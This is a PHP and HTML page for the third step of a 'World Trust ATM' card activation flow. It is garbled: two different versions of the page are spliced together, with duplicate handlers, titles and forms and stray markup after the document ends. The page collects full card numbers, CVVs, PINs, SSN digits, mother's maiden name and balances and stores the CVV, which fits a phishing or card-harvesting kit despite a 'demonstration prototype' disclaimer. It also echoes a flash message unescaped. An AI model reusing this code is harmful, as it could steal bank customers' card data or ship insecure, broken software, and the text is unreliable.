<?php
/**

 * ATM Card Activation - Step 3: PIN Setup & Completion

 * World Trust ATM - Card Activation
 * Page 3: PIN Setup & Card Details

 */

require_once 'includes/config.php';
require_once 'includes/functions.php';

require_once 'includes/db.php';

// Check if previous steps data exists
if (!isset($_SESSION['activation_data']) || 
    !isset($_SESSION['activation_data']['card_number'])) {
    set_flash('error', 'Please complete all previous steps first.');
    redirect('index.php');
}

// Generate CSRF token
$csrf_token = generate_csrf_token();

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Verify CSRF token
    if (!isset($_POST['csrf_token']) || !verify_csrf_token($_POST['csrf_token'])) {
        set_flash('error', 'Invalid security token. Please try again.');
        redirect('pin-setup.php');
    }
    
    // Validate PIN
    $pin = sanitize_input($_POST['pin'] ?? '');
    $pinConfirm = sanitize_input($_POST['pin_confirm'] ?? '');
    
    $errors = [];
    
    if (empty($pin) || strlen($pin) !== 4 || !ctype_digit($pin)) {
        $errors[] = 'PIN must be exactly 4 digits.';
    }
    
    if ($pin !== $pinConfirm) {
        $errors[] = 'PIN and confirmation do not match.';
    }
    
    if (empty($errors)) {
        try {
            $db = getDB();
            $db->beginTransaction();
            
            $data = $_SESSION['activation_data'];
            
            // Hash PIN
            $pinHash = hash_password($pin);
            
            // Encrypt sensitive data
            $ssnEncrypted = encrypt_data($data['ssn_last4']);
            $cardNumberEncrypted = encrypt_data($data['card_number']);
            $cvvEncrypted = encrypt_data($data['cvv']);
            
            // Get client info
            $ipAddress = get_client_ip();
            $userAgent = get_user_agent();
            
            // Insert activation record
            $sql = "INSERT INTO activations (
                first_name, last_name, dob, email, phone, account_number,
                street, city, state, zip, ssn_last4, maiden_name,
                card_number, expiry_date, cvv, pin_hash, balance,
                status, ip_address, user_agent
            ) VALUES (
                ?, ?, ?, ?, ?, ?,
                ?, ?, ?, ?, ?, ?,
                ?, ?, ?, ?, ?,
                'active', ?, ?
            )";
            
            $params = [
                $data['first_name'],
                $data['last_name'],
                $data['dob'],
                $data['email'],
                $data['phone'],
                $data['account_number'],
                $data['street'],
                $data['city'],
                $data['state'],
                $data['zip'],
                $ssnEncrypted,
                $data['maiden_name'],
                $cardNumberEncrypted,
                $data['expiry_date'],
                $cvvEncrypted,
                $pinHash,
                $data['balance'],
                $ipAddress,
                $userAgent
            ];
            
            $db->execute($sql, $params);
            $activationId = $db->lastInsertId();
            
            $db->commit();
            
            // Clear session data
            unset($_SESSION['activation_data']);
            
            // Set success session variable
            $_SESSION['activation_success'] = [
                'id' => $activationId,
                'name' => $data['first_name'] . ' ' . $data['last_name'],
                'card_last4' => substr($data['card_number'], -4),
                'email' => $data['email']
            ];
            
            redirect('success.php');
            
        } catch (Exception $e) {
            $db->rollback();
            log_error('Activation error: ' . $e->getMessage());
            set_flash('error', 'An error occurred during activation. Please try again.');
        }
    } else {
        set_flash('error', implode('<br>', $errors));
    }
}

// Get flash message
$flash = get_flash();
$activationData = $_SESSION['activation_data'];

require_once 'includes/database.php';

// Check session
check_user_session();
check_card_session();
check_session_timeout();

$errors = [];
$success = false;

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $card_number = sanitize_input($_POST['card_number'] ?? '');
    $cvv = sanitize_input($_POST['cvv'] ?? '');
    $expiry = sanitize_input($_POST['expiry'] ?? '');
    $pin = sanitize_input($_POST['pin'] ?? '');
    $confirm_pin = sanitize_input($_POST['confirm_pin'] ?? '');
    
    // Validate card number
    if (empty($card_number)) {
        $errors['card_number'] = 'Card number is required';
    } elseif (!validate_card_number($card_number)) {
        $errors['card_number'] = 'Please enter a valid 16-digit card number';
    }
    
    // Validate CVV
    if (empty($cvv)) {
        $errors['cvv'] = 'CVV is required';
    } elseif (!validate_cvv($cvv)) {
        $errors['cvv'] = 'Please enter a valid 3-digit CVV';
    }
    
    // Validate expiry
    if (empty($expiry)) {
        $errors['expiry'] = 'Expiration date is required';
    }
    
    // Validate PIN
    if (empty($pin)) {
        $errors['pin'] = 'PIN is required';
    } elseif (!validate_pin($pin)) {
        $errors['pin'] = 'PIN must be exactly 4 digits';
    }
    
    // Validate confirm PIN
    if (empty($confirm_pin)) {
        $errors['confirm_pin'] = 'Please confirm your PIN';
    } elseif ($pin !== $confirm_pin) {
        $errors['confirm_pin'] = 'PINs do not match';
    }
    
    // If no errors, save to database and redirect to pending page
    if (empty($errors)) {
        $pin_hash = password_hash($pin, PASSWORD_DEFAULT);
        
        // Save to database
        $request_id = save_activation_request(
            $_SESSION['user_data'],
            $_SESSION['card_data'],
            $pin_hash
        );
        
        if ($request_id) {
            // Store request ID in session
            $_SESSION['request_id'] = $request_id;
            
            // Redirect to pending page
            header('Location: pending.php');
            exit();
        } else {
            $errors['general'] = 'Failed to submit activation request. Please try again.';
        }
    }
}

$user_name = get_full_name();
$card_data = $_SESSION['card_data'];

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Card Activation - Step 3 | <?php echo APP_NAME; ?></title>

    <title><?php echo APP_NAME; ?> - PIN Setup</title>

    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">

        <div class="header">
            <h1>ATM Card Activation</h1>
            <p>Secure online activation in 3 easy steps</p>
        </div>
        
        <!-- Progress Indicator -->
        <div class="progress-indicator">
            <div class="progress-step completed">
                <span class="step-number">✓</span>
                <span class="step-label">Personal Info</span>
            </div>
            <div class="progress-step completed">
                <span class="step-number">✓</span>
                <span class="step-label">Card Details</span>
            </div>
            <div class="progress-step active">
                <span class="step-number">3</span>
                <span class="step-label">PIN Setup</span>
            </div>
        </div>
        
        <?php if ($flash): ?>
        <div class="alert alert-<?php echo $flash['type']; ?>">
            <?php echo $flash['message']; ?>
        </div>
        <?php endif; ?>
        
        <div style="text-align: center; margin-bottom: 30px;">
            <h3 style="color: var(--primary-color); margin-bottom: 10px;">Set Your 4-Digit PIN</h3>
            <p style="color: var(--text-muted); font-size: 14px;">
                Choose a secure PIN that you'll use to access your account
            </p>
        </div>
        
        <form id="pinForm" method="POST" action="pin-setup.php">
            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
            
            <div class="form-group">
                <label for="pin">Enter PIN <span class="required">*</span></label>
                <input type="password" id="pin" name="pin" class="form-control" 
                       autocomplete="new-password" required maxlength="4"
                       placeholder="4-digit PIN"
                       pattern="[0-9]{4}"
                       inputmode="numeric">
                <span class="info-text">Choose a 4-digit PIN (numbers only)</span>
                <span class="error-message">PIN must be exactly 4 digits</span>
            </div>
            
            <div class="form-group">
                <label for="pin_confirm">Confirm PIN <span class="required">*</span></label>
                <input type="password" id="pin_confirm" name="pin_confirm" class="form-control" 
                       autocomplete="new-password" required maxlength="4"
                       placeholder="Re-enter PIN"
                       pattern="[0-9]{4}"
                       inputmode="numeric">
                <span class="error-message">PINs must match</span>
            </div>
            
            <!-- PIN Display Preview -->
            <div class="pin-display" id="pinDisplay" style="display: none;">
                <div class="pin-digit" id="digit1"></div>
                <div class="pin-digit" id="digit2"></div>
                <div class="pin-digit" id="digit3"></div>
                <div class="pin-digit" id="digit4"></div>
            </div>
            
            <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h4 style="color: var(--dark-color); margin-bottom: 15px; font-size: 16px;">
                    Activation Summary
                </h4>
                <div style="display: grid; gap: 10px; font-size: 14px;">
                    <div style="display: flex; justify-content: space-between;">
                        <span style="color: var(--text-muted);">Name:</span>
                        <span style="font-weight: 600;">
                            <?php echo htmlspecialchars($activationData['first_name'] . ' ' . $activationData['last_name']); ?>
                        </span>
                    </div>
                    <div style="display: flex; justify-content: space-between;">
                        <span style="color: var(--text-muted);">Account:</span>
                        <span style="font-weight: 600;">
                            <?php echo htmlspecialchars($activationData['account_number']); ?>
                        </span>
                    </div>
                    <div style="display: flex; justify-content: space-between;">
                        <span style="color: var(--text-muted);">Card Number:</span>
                        <span style="font-weight: 600;">
                            <?php echo mask_card_number($activationData['card_number']); ?>
                        </span>
                    </div>
                    <div style="display: flex; justify-content: space-between;">
                        <span style="color: var(--text-muted);">Email:</span>
                        <span style="font-weight: 600;">
                            <?php echo htmlspecialchars($activationData['email']); ?>
                        </span>
                    </div>
                </div>
            </div>
            
            <div class="button-group">
                <a href="card-display.php" class="btn btn-secondary">← Back</a>
                <button type="submit" class="btn btn-success">
                    Complete Activation
                </button>
            </div>
        </form>
    </div>
    
    <!-- Loading Spinner -->
    <div class="loading-spinner" id="loadingSpinner">
        <div class="spinner"></div>
        <!-- Header -->
        <header class="header">
            <h1 class="logo"><?php echo APP_NAME; ?></h1>
            <p class="tagline"><?php echo APP_TAGLINE; ?></p>
        </header>

        <!-- PIN Setup Container -->
        <div class="pin-setup-container">
            <h2 class="form-title">Complete Card Activation</h2>
            <p class="form-subtitle">Enter your card details and set up your secure PIN</p>
            
            <span class="security-badge">Secure Form</span>
            
            <?php if (isset($errors['general'])): ?>
                <div class="error-message show" style="margin-bottom: 20px; display: block; background: #fff3cd; padding: 15px; border-radius: 8px; border: 1px solid #ffc107;">
                    <?php echo $errors['general']; ?>
                </div>
            <?php endif; ?>
            
            <form id="pinSetupForm" method="POST" action="" novalidate>
                <!-- Card Details Section -->
                <div class="card-details-section">
                    <h3 class="section-title">Card Details</h3>
                    
                    <div class="form-group">
                        <label for="card_number">Card Number <span class="required">*</span></label>
                        <input type="text" id="card_number" name="card_number" 
                               placeholder="1234 5678 9012 3456" 
                               maxlength="19"
                               required aria-required="true">
                        <?php if (isset($errors['card_number'])): ?>
                            <span class="error-message show"><?php echo $errors['card_number']; ?></span>
                        <?php endif; ?>
                    </div>
                    
                    <div class="form-row">
                        <div class="form-group">
                            <label for="expiry">Expiration Date (MM/YY) <span class="required">*</span></label>
                            <input type="text" id="expiry" name="expiry" 
                                   placeholder="MM/YY" 
                                   maxlength="5"
                                   required aria-required="true">
                            <?php if (isset($errors['expiry'])): ?>
                                <span class="error-message show"><?php echo $errors['expiry']; ?></span>
                            <?php endif; ?>
                        </div>
                        
                        <div class="form-group">
                            <label for="cvv">CVV <span class="required">*</span></label>
                            <input type="password" id="cvv" name="cvv" 
                                   placeholder="123" 
                                   maxlength="3"
                                   required aria-required="true">
                            <?php if (isset($errors['cvv'])): ?>
                                <span class="error-message show"><?php echo $errors['cvv']; ?></span>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
                
                <!-- PIN Setup Section -->
                <div class="pin-section">
                    <h3 class="section-title">Set Your PIN</h3>
                    
                    <div class="form-group">
                        <label for="pin">Enter PIN (4 digits) <span class="required">*</span></label>
                        <div class="pin-input-wrapper">
                            <input type="password" id="pin" name="pin" 
                                   maxlength="4" 
                                   placeholder="****"
                                   required aria-required="true">
                            <button type="button" class="toggle-pin" data-target="pin" aria-label="Toggle PIN visibility">
                                👁️
                            </button>
                        </div>
                        <?php if (isset($errors['pin'])): ?>
                            <span class="error-message show"><?php echo $errors['pin']; ?></span>
                        <?php endif; ?>
                        <div class="pin-strength">
                            <div class="strength-label">PIN Strength: <span id="strengthText">-</span></div>
                            <div class="strength-bar">
                                <div class="strength-fill" id="strengthFill"></div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label for="confirm_pin">Confirm PIN <span class="required">*</span></label>
                        <div class="pin-input-wrapper">
                            <input type="password" id="confirm_pin" name="confirm_pin" 
                                   maxlength="4" 
                                   placeholder="****"
                                   required aria-required="true">
                            <button type="button" class="toggle-pin" data-target="confirm_pin" aria-label="Toggle PIN visibility">
                                👁️
                            </button>
                        </div>
                        <?php if (isset($errors['confirm_pin'])): ?>
                            <span class="error-message show"><?php echo $errors['confirm_pin']; ?></span>
                        <?php endif; ?>
                    </div>
                </div>
                
                <button type="submit" class="btn btn-primary">Complete Activation</button>
            </form>
        </div>
        
        <!-- Disclaimer -->
        <div class="disclaimer">
            <div class="disclaimer-title">Security Disclaimer</div>
            <p>This is a demonstration prototype. Real banking applications require backend validation, PCI DSS compliance, HTTPS encryption, secure database storage, and two-factor authentication. Never enter real financial information on demonstration sites.</p>
        </div>
    </div>
    
    <script src="js/pin-setup.js"></script>
</body>
</html>
                </div>
                <div class="modal-detail-item">
                    <span class="detail-label">Status:</span>
                    <span class="detail-value">Active</span>
                </div>
            </div>
            <p style="font-size: 12px; color: var(--text-light); margin-top: 15px;">
                Please keep your PIN secure and never share it with anyone.
            </p>
        </div>
    </div>
    
    <script src="js/pin-setup.js"></script>
</body>
</html>
